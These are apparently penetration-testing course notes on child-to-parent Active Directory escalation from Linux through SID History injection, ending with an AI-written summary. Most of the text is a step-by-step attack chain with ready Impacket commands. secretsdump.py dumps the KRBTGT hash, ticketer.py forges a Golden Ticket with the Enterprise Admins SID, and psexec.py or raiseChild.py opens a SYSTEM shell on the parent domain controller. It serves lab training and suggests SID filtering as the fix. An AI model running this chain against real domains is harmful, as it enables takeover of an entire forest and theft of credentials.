We can also perform the attack shown in the previous section from a Linux attack host. To do so, we'll still need to gather the same bits of information:

The KRBTGT hash for the child domain
The SID for the child domain
The name of a target user in the child domain (does not need to exist!)
The FQDN of the child domain
The SID of the Enterprise Admins group of the root domain
Once we have complete control of the child domain, LOGISTICS.INLANEFREIGHT.LOCAL, we can use secretsdump.py to DCSync and grab the NTLM hash for the KRBTGT account.

Next, we can use lookupsid.py from the Impacket toolkit to perform SID brute forcing to find the SID of the child domain. In this command, whatever we specify for the IP address (the IP of the domain controller in the child domain) will become the target domain for a SID lookup. The tool will give us back the SID for the domain and the RIDs for each user and group that could be used to create their SID in the format DOMAIN_SID-RID. For example, from the output below, we can see that the SID of the lab_adm user would be S-1-5-21-2806153819-209893948-922872689-1001.

We have gathered the following data points to construct the command for our attack. Once again, we will use the non-existent user hacker to forge our Golden Ticket.

The KRBTGT hash for the child domain: 9d765b482771505cbe97411065964d5f
The SID for the child domain: S-1-5-21-2806153819-209893948-922872689

The SID of the Enterprise Admins group of the root domain: S-1-5-21-3842939050-3880317879-2865463114-519
Next, we can use ticketer.py from the Impacket toolkit to construct a Golden Ticket. This ticket will be valid to access resources in the child domain (specified by -domain-sid) and the parent domain (specified by -extra-sid).

Impacket also has the tool raiseChild.py, which will automate escalating from child to parent domain. We need to specify the target domain controller and credentials for an administrative user in the child domain; the script will do the rest. If we walk through the output, we see that it starts by listing out the child and parent domain's fully qualified domain names (FQDN). It then:

Obtains the SID for the Enterprise Admins group of the parent domain
Retrieves the hash for the KRBTGT account in the child domain
Creates a Golden Ticket
Logs into the parent domain
Retrieves credentials for the Administrator account in the parent domain
Finally, if the target-exec switch is specified, it authenticates to the parent domain's Domain Controller via Psexec.

The script lists out the workflow and process in a comment as follows:

Code: python
#   The workflow is as follows:
#       Input:
#           1) child-domain Admin credentials (password, hashes or aesKey) in the form of 'domain/username[:password]'
#              The domain specified MUST be the domain FQDN.
#           2) Optionally a pathname to save the generated golden ticket (-w switch)
#           3) Optionally a target-user RID to get credentials (-targetRID switch)
#              Administrator by default.
#           4) Optionally a target to PSEXEC with the target-user privileges to (-target-exec switch).
#              Enterprise Admin by default.
#
#       Process:
#           1) Find out where the child domain controller is located and get its info (via [MS-NRPC])
#           2) Find out what the forest FQDN is (via [MS-NRPC])
#           3) Get the forest's Enterprise Admin SID (via [MS-LSAT])
#           4) Get the child domain's krbtgt credentials (via [MS-DRSR])
#           5) Create a Golden Ticket specifying SID from 3) inside the KERB_VALIDATION_INFO's ExtraSids array
#              and setting expiration 10 years from now
#           6) Use the generated ticket to log into the forest and get the target user info (krbtgt/admin by default)
#           7) If file was specified, save the golden ticket in ccache format
#           8) If target was specified, a PSEXEC shell is launched
#
#       Output:
#           1) Target user credentials (Forest's krbtgt/admin credentials by default)
#           2) A golden ticket saved in ccache for future fun and profit
#           3) PSExec Shell with the target-user privileges (Enterprise Admin privileges by default) at target-exec
#              parameter.
Though tools such as raiseChild.py can be handy and save us time, it is essential to understand the process and be able to perform the more manual version by gathering all of the required data points. In this case, if the tool fails, we are more likely to understand why and be able to troubleshoot what is missing, which we would not be able to if blindly running this tool. In a client production environment, we should always be careful when running any sort of "autopwn" script like this, and always remain cautious and construct commands manually when possible. Other tools exist which can take in data from a tool such as BloodHound, identify attack paths, and perform an "autopwn" function that can attempt to perform each action in an attack chain to elevate us to Domain Admin (such as a long ACL attack path). I would recommend avoiding tools such as these and work with tools that you understand fully, and will also give you the greatest degree of control throughout the process.

We don't want to tell the client that something broke because we used an "autopwn" script!

More Fun
In the next section, we will briefly discuss some techniques that can be used for cross-forest trust abuse when we find ourselves in an environment with a bidirectional forest trust (meaning we can authenticate into another forest). We will not cover all possible cross-forest trust attacks, as those will be covered in great detail in later modules.

GPT Summary - 

This section shows how to abuse SID History from Linux instead of Windows. Same core concept as before:

Abuse trust between child and parent domain

Inject Enterprise Admins SID from parent domain into a Golden Ticket forged in child domain

Result? You become a full-blown Enterprise Admin in the parent domain—even if your user doesn’t exist!

This is done using Impacket tools like:

secretsdump.py

lookupsid.py

ticketer.py

psexec.py

(optionally) raiseChild.py for automation

🧭 Workflow – “Got This? → Do That”
🔐 SIDHistory Escalation (Linux Edition)
✅ Got This?	➡️ Do That
Foothold in child domain	DCSync child domain’s KRBTGT hash using secretsdump.py
Domain creds for user	Use lookupsid.py to get child and parent domain SIDs
Enterprise Admin SID from parent	Save this to use in /extra-sid flag
A user (real or fake)	Use ticketer.py to forge Golden Ticket with /extra-sid
Ticket created	Export it as ccache and set KRB5CCNAME
Want to test access?	Use psexec.py to get SYSTEM shell on parent DC
Prefer automation?	Use raiseChild.py (only if you know the manual process)
🛠️ Linux Command Flow
1. 🧬 Dump KRBTGT Hash from Child Domain:
bash
Copy
Edit
secretsdump.py logistics.inlanefreight.local/htb-student_adm@<CHILD_DC_IP> -just-dc-user LOGISTICS/krbtgt
2. 🔎 Get Child Domain SID:
bash
Copy
Edit
lookupsid.py logistics.inlanefreight.local/htb-student_adm@<CHILD_DC_IP>
3. 🔎 Get Parent Domain SID + Enterprise Admin RID:
bash
Copy
Edit
lookupsid.py logistics.inlanefreight.local/htb-student_adm@<PARENT_DC_IP> | grep -B12 "Enterprise Admins"
🔐 Common RID for Enterprise Admins: -519
Final SID: S-1-5-21-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-519

4. 🎟️ Create Golden Ticket with ticketer.py:
bash
Copy
Edit
ticketer.py -nthash <KRBTGT_HASH> \
-domain <CHILD_FQDN> \
-domain-sid <CHILD_SID> \
-extra-sid <PARENT_EA_SID> hacker
This creates a .ccache Kerberos ticket file.

5. 📦 Export Ticket for Session:
bash
Copy
Edit
export KRB5CCNAME=hacker.ccache
6. 🖥️ Use psexec.py to Compromise Parent Domain DC:
bash
Copy
Edit
psexec.py <CHILD_DOMAIN>/hacker@<PARENT_DC_FQDN> -k -no-pass -target-ip <PARENT_DC_IP>
✅ Optional: Use raiseChild.py to Automate All Above
bash
Copy
Edit
raiseChild.py -target-exec <PARENT_DC_IP> LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
But be cautious—manual execution gives you better control and visibility.

🧩 Patterns, Hints & Tips
🔍 Pattern	🧠 Insight
All attacks stem from child → parent trust	This is an in-forest trust abuse case
ticketer.py + /extra-sid = EA access	Doesn't matter if hacker user exists or not
Same 5 data points always needed	KRBTGT hash, child SID, parent EA SID, fake username, child FQDN
raiseChild.py is cool but risky	Only use if you're confident in the manual process
KRB5CCNAME handles session ticket use	Must set it before impersonating with psexec.py
Don’t autopwn unless you can manualpwn	Always be ready to troubleshoot failures
🧠 If This → Then That
If...	Then...
You dumped child KRBTGT	You can forge Golden Tickets for that domain
You added /extra-sid for Enterprise Admins	You now impersonate an Enterprise Admin in the parent domain
You can’t get access with psexec.py	Double-check your domain SID formatting and KRB5 ticket loading
raiseChild.py fails	Fall back to secretsdump ➝ lookupsid ➝ ticketer manually
You get SYSTEM on parent DC	You now own the forest 💀
📝 Reporting Tips
If SID filtering is not enforced, and this trust exists = Critical vulnerability.

Highlight the risk of cross-domain privilege escalation through SID History injection.

Recommend enabling SID Filtering for all inter-domain trusts unless explicitly needed.

Document the trust path and show how a low-priv account in one domain can escalate to forest-wide control.
